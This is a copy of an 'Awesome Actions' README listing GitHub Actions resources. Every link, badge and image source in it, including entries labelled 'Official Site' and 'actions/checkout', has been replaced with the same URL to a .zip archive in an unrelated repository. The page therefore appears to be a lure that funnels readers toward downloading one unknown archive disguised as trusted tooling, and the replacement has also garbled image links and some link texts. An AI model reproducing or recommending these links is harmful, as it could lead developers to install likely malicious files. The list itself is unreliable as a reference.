<p align="center">
  <br>
    <img src="https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip" width="150"/>
  <br>
</p>

# Awesome Actions [![Awesome](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) [<!--lint ignore no-dead-urls-->![GitHub Actions status | sdras/awesome-actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip%20Awesome%https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip+Awesome+List)

> A curated list of awesome things related to GitHub Actions.

Actions are triggered by GitHub platform events directly in a repo and run on-demand workflows either on Linux, Windows or macOS virtual machines or inside a container in response. With GitHub Actions you can automate your workflow from idea to production.

## Contents

- [Official Resources](#official-resources)
  - [Workflow Examples](#workflow-examples)
  - [Official Actions](#official-actions)
  - [Create your Actions](#create-your-actions)
- [Community Resources](#community-resources)
  - [GitHub Tools and Management](#github-tools-and-management)
  - [Collection of Actions](#collection-of-actions)
  - [Utility](#utility)
  - [Static Analysis](#static-analysis)
  - [Dynamic Analysis](#dynamic-analysis)
  - [Monitoring](#monitoring)
  - [Pull Requests](#pull-requests)
  - [GitHub Pages](#github-pages)
  - [Notifications and Messages](#notifications-and-messages)
  - [Deployment](#deployment)
  - [External Services](#external-services)
  - [Frontend Tools](#frontend-tools)
  - [Machine Learning Ops](#machine-learning-ops)
  - [Build](#build)
  - [Database](#database)
  - [Networking](#networking)
  - [Localization](#localization)
  - [Fun](#fun)
  - [Cheat Sheet](#cheat-sheet)
- [Tutorials](#tutorials)

## Official Resources

- [Official Site](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Official Documentation](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Official Actions organization](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
  - [actions/virtual-environments](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - GitHub Actions virtual environments.
  - [actions/runner](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - The Runner for GitHub Actions.
- [GitHub Blog Announcement](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Workflow Examples

- [actions/starter-workflows](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Starter workflow management.
- [actions/example-services](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Example workflows using service containers.

### Official Actions

<!--lint disable no-dead-urls-->

#### Workflow Tool Actions

Tool actions for your workflow.

<!--lint ignore awesome-spell-check-->

- [actions/checkout](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Setup your repository on your workflow.
- [actions/upload-artifact](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Upload artifacts from your workflow.
- [actions/download-artifact](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Download artifacts from your build.
- [actions/cache](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Cache dependencies and build outputs in GitHub Actions.
- [actions/github-script](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Write a script for GitHub API and the workflow contexts.

#### Actions for GitHub Automation

Automate management for issues, pull requests, and releases.

- [actions/create-release](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - An Action to create releases via the GitHub Release API.
- [actions/upload-release-asset](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - An Action to upload a release asset via the GitHub Release API.
- [actions/first-interaction](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - An action for filtering pull requests and issues from first-time contributors.
- [actions/stale](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Marks issues and pull requests that have not had recent interaction.
- [actions/labeler](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - An action for automatically labelling pull requests.
- [actions/delete-package-versions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Delete versions of a package from GitHub Packages.

#### Setup Actions

Set up your GitHub Actions workflow with a specific version of your programming languages.

- [actions/setup-node: https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-python: Python](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-go: Go](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-dotnet: .NET core sdk](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-haskell: Haskell (GHC and Cabal)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-java: Java](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-ruby: Ruby](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-elixir: Elixir](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [actions/setup-julia: Julia](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Create your Actions

#### JavaScript and TypeScript Actions

- [actions/toolkit](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - The GitHub ToolKit for developing GitHub Actions.
- [actions/hello-world-javascript-action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - A template to demonstrate how to build a JavaScript action.
- [actions/javascript-action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Create a JavaScript Action.
- [actions/typescript-action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Create a TypeScript Action.
- [actions/http-client](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - A lightweight HTTP client optimized for use with actions, TypeScript with generics and async await.

#### Docker Container Actions

- [actions/hello-world-docker-action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - A template to demonstrate how to build a Docker action.
- [actions/container-toolkit-action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Template repo for creating container actions using actions/toolkit.

## Community Resources

### GitHub Tools and Management

- [Declaratively setup GitHub Labels](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Action to sync GitHub labels in the declarative way](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add releases to GitHub](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish a docker image to Dockerhub](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create an issue using content from a file](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish GitHub Releases with Assets](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Project Automation+](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Automate GitHub Project cards with any webhook event.
- [Run GitHub Actions Locally with a web interface](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run GitHub Actions Locally in Terminal](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build and Publish Android debug APK](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate sequential build numbers for GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Push Git changes to GitHub repository without authentication difficulties](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate release notes based on your events](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create a GitHub wiki page based on the provided markdown file](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Label your Pull Requests auto-magically (using committed files)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add Label to your Pull Requests based on the author team name](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Get a list of file changes with PR/Push](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Use private actions in any workflow](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Label Your Issues Using the Issue's Contents](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Rollback a GitHub Release](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Lock Closed Issues and Pull Requests after a Period of Inactivity](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Get Commit Difference Count Between Two Branches](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate Release Notes Based on Git References](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Enforce Policies on GitHub Repositories and Commits](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Auto Label Issue Based on Issue Description](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Update Configured GitHub Actions to the Latest Versions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create Issue Branch](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Remove Old Artifacts](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Expose Git Commit Data As Environment Variables](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Sync Defined Files/Binaries to Wiki or External Repositories](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create/Update/Delete a GitHub Wiki Page Based on Any File](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Prow GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Automation of policy enforcement, chat-ops, and automatic PR merging.
- [Check GitHub Status in your Workflow](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Manage Labels on GitHub (create/rename/update/delete) as Code](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Continuous Distribution of Funding to your Project Contributors and Dependencies](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Herald Rules for GitHub: Add Subscribers, Assignees, Labels, and More to Your PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Codeowners Validator](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Ensures the correctness of your GitHub CODEOWNERS file. It supports public and private GitHub repositories and also GitHub Enterprise installations.
- [Copybara Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Move and transform code between repositories (ideal to maintain several repos from one monorepo).

### Collection of Actions

- [Use HashiCorp's Terraform](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Yarn 1](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Yarn 2](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Golang](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for R and accompanying #rstats package](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for WordPress](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Composer](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Flutter](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for PHP](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Rust](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Android](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Logtalk and Prolog](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Deno](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Unity](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Octions - GitHub Actions for GitHub REST API](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Docker](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for AWS](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Actions Hub](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Utility

- [Setup `ssh-agent`](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Run `ssh-agent` with additional SSH keys to access private repositories.
- [GitHub Actions Badges for your README](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Python project with poetry](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Python project with pyenv](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions to compile LaTeX documents](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Update Maxmind Databases](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Debug with SSH over tmate](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Debug the Action directly by providing a SSH connection.
- [Unlock git-crypt files](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Golang CGO cross compiler](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run your job on another architecture: arm32, aarch64 and others](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate a table of contents](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically add Label or Assignee to an Issue](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Action to send LGTM reaction as image or GIF when we say lgtm](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate build numbers across multiple scopes](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish GitHub release artifacts](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Jekyll Diff Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Diffs the built Jekyll site after a change, and comments the result back to GitHub.
- [Branch Protection Bot](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Temporarily disable and re-enable "Include administrators" option in branch protection.
- [Wait for commit statuses](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Wait until all statuses and checks are successful or any of them has failed and set its status output accordingly.
- [Get Latest Tag](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Get the previous tag from git.
- [Create Milestone](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Create a new open milestone given the title and description.
- [Close Milestone](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Close the given milestone.
- [Action to enforce branch naming rules](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Expose slug of some GitHub variables](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [awesome-lint as a GitHub Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Edit JSON File](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build Slate documentation](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Read Properties](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Read values from `.properties` files.
- [Write Properties](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Write values to `.properties` files.
- [Autotag](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Automatically generate a new tag when the manifest file (i.e. `https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip`) version changes.
- [Apply templates with Jinja2](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Use the Jinja2 template engine to generate files from templates.
- [Has Changes](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Check if there are code changes from previous steps.
- [Mind Your Language Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Detect offensive comments in issues and pull requests, and warn senders.
- [YAML/JSON/XML Converter](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Converts YAML/JSON/XML file formats interchangeably.
- [NSFW Detection](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Detect NSFW content in committed files.
- [Has Changed Path](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Conditionally run actions based on changed paths.
- [Linguist](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Checks a repository and produces information about used languages in output.
- [Twilio Voice Call](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Make Twilio voice call with defined text.
- [Setup Xcode](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Switch between pre-installed versions of Xcode for macOS images.
- [Setup Xamarin](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Switch between pre-installed versions of Xamarin and Mono for macOS images.
- [Memer Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - A GitHub Action for Programmer Memes xD.
- [Setup Cocoapods](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Setup specific version of Cocoapods.
- [Public IP](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Queries GitHub actions runner's public IP address.
- [GitHub Actions for Lazarus/FPC](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Twilio Fax](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Sends a document by fax using your Twilio account.
- [Setup Kubernetes tools](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Install Kubernetes tools (kubectl, kustomize, helm, kubeval, conftest, and yq) on the runner.
- [Setup Elastic Cloud Control Tool](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Install a specific version of ecctl on the runner.
- [PowerShell Script](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Run PowerShell scripts with workflow contexts (e.g. `$https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip`) and cmdlets, return value => action output.
- [Upload and Scan Files with VirusTotal](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Import a GPG Key](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Compress with UPX](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - The Ultimate Packer for eXecutables.
- [Pull the New Go Module Version Into the Proxy Cache](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Ensures the latest version of your Go module is in the proxy cache. Also updates the https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip documentation upon release.
- [Delete Run Artifacts](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Deletes all artifacts at the end of a workflow run.
- [GitHub Environment Variables Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Expose environment variables such as the branch/tag name, repository slug, and ref slug.
- [GitHub Action Locks](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Guarantee atomic execution of your GitHub Action workflows.
- [Paths Filter](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Conditionally run actions based on files modified by PR, feature branch or pushed commits.
- [Minisauras](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) -  Pulls all the JavaScript and CSS files from your base branch, minify them and creates a pull-request with a new branch.
- [Website to GIF](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Turn any webpage into a GIF to display on your README, docs, etc.
- [Interactive Inputs - Runtime workflow inputs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Add dynamic inputs at runtime for your GitHub Actions workflows

#### Environments

- [Create an envfile](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Export global environment variables for succeeding build steps](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Programmatically set environment variables for use in subsequent steps](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Install Conda environments for Python](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Setup NativeScript](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create a JSON Environment File](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Dependencies

- [Install NPM Dependencies with Caching](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Highlight New NPM Dependencies](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Comments on pull requests newly added NPM dependencies information.
- [Cache NPM Dependencies](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Cache Yarn Dependencies](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Semantic Versioning

- [Next SemVers](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Output the next version for major, minor, and patch version based on the given semver version.
- [Get latest SemVer and branch name given a search string](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Cut Release Branch](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Cuts a release branch given a branch prefix and optional semantic version.
- [Increment Semantic Version](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Bump a given semantic version (SemVer), depending on given release type.

### Static Analysis

- [PHPStan Static code analyzer Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GraphQL Inspector Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [PowerShell static analysis with PSScriptAnalyzer](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run tfsec, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Testing

- [Run Tests through Puppeteer, the Headless Chrome Node API](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [xUnit Slack Reporter: Sends summary of tests from xUnit reports to a Slack channel](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run codeception tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run TestCafe tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Unity tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Cypress E2E tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Test Ansible roles with Molecule](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run performance testing with https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Detect Flaky Tests with BuildPulse](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Display Inline Code Annotations for Jest Tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Julia tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Linting

- [PHP Coding Standards Fixer Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Runs Hadolint against a Dockerfile within a repository](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
